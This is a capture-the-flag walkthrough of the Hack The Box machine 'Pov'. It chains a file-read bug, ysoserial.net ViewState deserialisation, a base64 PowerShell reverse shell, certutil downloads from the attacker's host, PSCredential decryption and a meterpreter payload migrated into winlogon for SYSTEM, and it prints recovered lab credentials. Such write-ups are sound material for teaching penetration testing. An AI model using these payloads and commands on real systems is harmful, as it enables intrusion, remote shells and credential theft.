# Pov

<figure><img src="../../.gitbook/assets/image (374).png" alt=""><figcaption></figcaption></figure>

## Enumeration 1

```bash
nmap -A -p- -sC -sV -Pn -v pov.htb
```

{% code overflow="wrap" %}
```
NSE: Script scanning 10.10.11.251.
Initiating NSE at 13:43
Completed NSE at 13:43, 5.05s elapsed
Initiating NSE at 13:43
Completed NSE at 13:43, 0.19s elapsed
Initiating NSE at 13:43
Completed NSE at 13:43, 0.00s elapsed
Nmap scan report for pov.htb (10.10.11.251)
Host is up (0.045s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-favicon: Unknown favicon MD5: E9B5E66DEBD9405ED864CAC17E2A888E
|_http-title: pov.htb
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   44.54 ms 10.10.14.1
2   46.01 ms pov.htb (10.10.11.251)

NSE: Script Post-scanning.
Initiating NSE at 13:43
Completed NSE at 13:43, 0.00s elapsed
Initiating NSE at 13:43
Completed NSE at 13:43, 0.00s elapsed
Initiating NSE at 13:43
Completed NSE at 13:43, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 154.49 seconds
           Raw packets sent: 131260 (5.779MB) | Rcvd: 708 (137.723KB)

```
{% endcode %}

### Port 80 - pov.htb

<figure><img src="../../.gitbook/assets/image (375).png" alt=""><figcaption></figcaption></figure>

The enumeration of possible directories does not lead to anything special attention:

<figure><img src="../../.gitbook/assets/image (376).png" alt=""><figcaption></figcaption></figure>

### Port 80 - dev.pov.htb

<figure><img src="../../.gitbook/assets/image (377).png" alt=""><figcaption></figcaption></figure>

It's possible to download the CV:

<figure><img src="../../.gitbook/assets/image (378).png" alt=""><figcaption></figcaption></figure>

The enumeration of possible directories does not lead to anything special attention:

<figure><img src="../../.gitbook/assets/image (379).png" alt=""><figcaption></figcaption></figure>

### Info

* sfitz@pov.htb
* IIS httpd 10.0
* Microsoft Windows Server 2019
* dev.pov.htb subdomain

## Exploitation (foothold)

If we intercept the request of downloading CV and we change the requested file with `/web.config`:

<figure><img src="../../.gitbook/assets/image (380).png" alt=""><figcaption></figcaption></figure>

We can obtain the decryption key:

<figure><img src="../../.gitbook/assets/image (381).png" alt=""><figcaption></figcaption></figure>

We can also request other files like `default.aspx`:

<figure><img src="../../.gitbook/assets/image (382).png" alt=""><figcaption></figcaption></figure>

And we can see the backend code C#:

<figure><img src="../../.gitbook/assets/image (383).png" alt=""><figcaption></figcaption></figure>

Referer to for the following exploitation tecnique used:

{% embed url="https://app.gitbook.com/o/vT3qAbFb24L8AykOJFUN/s/TCIl1wYtSi9DHHnby2Od/web/asp.net" %}

Now, MAC has been enabled for ViewState and due to vulnerability of local file reads we got access to the web.config file with configurations like validation key and algorithm as shown above, we can make use of `ysoserial.net` and generate payloads by providing the validation key and algorithm as parameters.

We can use the following command to generate the payload to insert in place of original \_\_VIEWSTATE value:

{% code overflow="wrap" %}
```powershell
ysoserial.exe -p ViewState -g TextFormattingRunProperties --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio/default.aspx" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" -c "powershell.exe IWR http://10.10.15.101:8000"
```
{% endcode %}

If we click on Send inside BurpSuite we obtain a request done to our netcat listening:

```bash
rlwrap nc -lvnp 8000
```

<figure><img src="../../.gitbook/assets/image (384).png" alt=""><figcaption></figcaption></figure>

So we can now trigger a reverse shell using a Powershell base64 encoded (to avoid " escaping issues)

{% code overflow="wrap" %}
```powershell
ysoserial.exe -p ViewState -g TextFormattingRunProperties --validationalg="SHA1" --validationkey="5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468" --path="/portfolio/default.aspx" --decryptionalg="AES" --decryptionkey="74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43" -c "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA1AC4AMQAwADEAIgAsADgAMAAwADAAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA"
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (385).png" alt=""><figcaption></figcaption></figure>

## Enumeration 2

There is no user flag as sfitz but with command `net user` we can see that there are other users like alaading so we need to search furthermore. Under Documents folder there is a connection.xml file:

<figure><img src="../../.gitbook/assets/image (386).png" alt=""><figcaption></figcaption></figure>

```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">alaading</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb01000000cdfb54340c2929419cc739fe1a35bc88000000000200000000001066000000010000200000003b44db1dda743e1442e77627255768e65ae76e179107379a964fa8ff156cee21000000000e8000000002000020000000c0bd8a88cfd817ef9b7382f050190dae03b7c81add6b398b2d32fa5e5ade3eaa30000000a3d1e27f0b3c29dae1348e8adf92cb104ed1d95e39600486af909cf55e2ac0c239d4f671f79d80e425122845d4ae33b240000000b15cd305782edae7a3a75c7e8e3c7d43bc23eaae88fde733a28e1b9437d3766af01fdf6f2cf99d2a23e389326c786317447330113c5cfa25bc86fb0c6e1edda6</SS>
    </Props>
  </Obj>
</Objs>

```



{% hint style="info" %}
PowerShell gives us a built-in way to both store and retrieve username and passwords securely using the commands Get-Credential, Export-CliXml and Import-CliXml.

Here's how you'd save a PSCredential object to a file:

```powershell
Get-Credential | Export-CliXml  -Path MyCredential.xml
```

When you export credentials using the following command:

```powershell
$Credential = Get-Credential
$Credential | Export-CliXml -Path .\MyCredential.xml
```

Then, you want to use these credentials that have been exported previously, in a script for example.

You cannot use these credentials because items encrypted with one account cannot be decrypted using another account.

So, you must “runas” the script with the account you created the credentials file.
{% endhint %}

We try to decrypt the credentials using `sfitz` user:

```powershell
cd "C:\Users\sfitz\Documents"
$credential = Import-CliXml -Path .\connection.xml
$credential.GetNetworkCredential().Password
```

...and it's a win!

<figure><img src="../../.gitbook/assets/image (387).png" alt=""><figcaption></figcaption></figure>

### Info

* username: `alaading` / password:`f8gQ8fynP44ek1m3`

## Privilege Escalation

Escalating locally not work so If we cannot switch user due to such as reverse shell sessions, we can spawn another shell as another user by using [RunasCS](https://github.com/antonioCoco/RunasCs).

```bash
python3 -m http.server 9000
```

<figure><img src="../../.gitbook/assets/image (388).png" alt=""><figcaption></figcaption></figure>

```powershell
certutil -f -urlcache http://10.10.15.101:9000/RunasCs.exe RunasCs.exe
```

Try to obtain a reverse shell as another user:

```bash
rlwrap nc -lnvp 7777
```

<pre class="language-powershell"><code class="lang-powershell"><strong>.\RunasCs.exe alaading f8gQ8fynP44ek1m3 powershell.exe -r 10.10.15.101:7777
</strong></code></pre>

...and we obtain the user flag!

<figure><img src="../../.gitbook/assets/image (389).png" alt=""><figcaption></figcaption></figure>

## Enumeration

```powershell
whoami /priv
```

<figure><img src="../../.gitbook/assets/image (390).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```powershell
certutil.exe -f -urlcache http://10.10.15.101:9000/EnableAllTokenPrivs.ps1 EnableAllTokenPrivs.ps1
```
{% endcode %}

```powershell
.\EnableAllTokenPrivs.ps1
```

<figure><img src="../../.gitbook/assets/image (391).png" alt=""><figcaption></figcaption></figure>

## SeDebugPrivilege

Easy system shell. You can update update proc attribute list with this privilege and can elevate privileges.

Generate a payload:

{% code overflow="wrap" %}
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.15.101 LPORT=5555 -f exe > exploit.exe
```
{% endcode %}

Configure the Meterpreter on your machine and run “exploit.exe” on the victim machine.

<figure><img src="../../.gitbook/assets/image (392).png" alt=""><figcaption></figcaption></figure>

Type `ps` and find the PID of “winlogon.exe”:

<figure><img src="../../.gitbook/assets/image (393).png" alt=""><figcaption></figcaption></figure>

Then type `migrate PID_VALUE`

<figure><img src="../../.gitbook/assets/image (394).png" alt=""><figcaption></figcaption></figure>

and after that `shell`&#x20;

<figure><img src="../../.gitbook/assets/image (395).png" alt=""><figcaption></figcaption></figure>

Now, you have access as NT AUTHORITY\SYSTEM.

<figure><img src="../../.gitbook/assets/image (396).png" alt=""><figcaption></figcaption></figure>
